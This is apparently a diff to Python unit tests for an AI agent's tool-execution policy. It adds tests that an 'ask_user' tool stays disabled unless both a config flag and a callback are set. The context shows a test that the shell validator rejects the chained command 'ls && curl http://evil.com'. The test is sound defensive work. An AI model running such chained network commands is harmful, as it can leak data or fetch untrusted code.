@@ -119,6 +119,47 @@ class PolicyTests(unittest.TestCase):
         with self.assertRaises(ToolPolicyError):
             validator.validate(self._call("run_shell", {"command": "ls && curl http://evil.com"}))
 
+
+class InteractionToolTests(unittest.TestCase):
+    def setUp(self):
+        self.tmp = Path(tempfile.mkdtemp())
+        self.config = _make_config(self.tmp)
+        self.policy = _make_policy(self.config)
+
+    def _call(self, name, args):
+        return ToolCall(name=name, arguments=args)
+
+    def test_ask_user_disabled_returns_error_without_reading_terminal(self):
+        tmp = Path(tempfile.mkdtemp())
+        config = ToolRuntimeConfig(workspace_root=tmp, allow_ask_user=False)
+        executor = ToolExecutor(config, approval_handler=_auto_approve())
+        executor.set_ask_user_fn(lambda _question, _options: (_ for _ in ()).throw(AssertionError("should not ask")))
+
+        result = executor.execute(ToolCall(
+            name="ask_user",
+            arguments={"question": "Perguntar?", "options": ["sim", "não"]},
+        ))
+
+        self.assertFalse(result.ok)
+        self.assertIn("ask_user está desativado", result.error)
+
+    def test_ask_user_available_requires_config_and_callback(self):
+        tmp = Path(tempfile.mkdtemp())
+        disabled = ToolExecutor(
+            ToolRuntimeConfig(workspace_root=tmp, allow_ask_user=False),
+            approval_handler=_auto_approve(),
+        )
+        disabled.set_ask_user_fn(lambda _question, _options: (0, "sim"))
+
+        enabled = ToolExecutor(
+            ToolRuntimeConfig(workspace_root=tmp, allow_ask_user=True),
+            approval_handler=_auto_approve(),
+        )
+        enabled.set_ask_user_fn(lambda _question, _options: (0, "sim"))
+
+        self.assertFalse(disabled.is_ask_user_available())
+        self.assertTrue(enabled.is_ask_user_available())
+
     def test_run_shell_chain_subshell_blocked(self):
         """Verifica que Test run shell chain subshell blocked."""
         validator = ShellToolValidator(self.config)
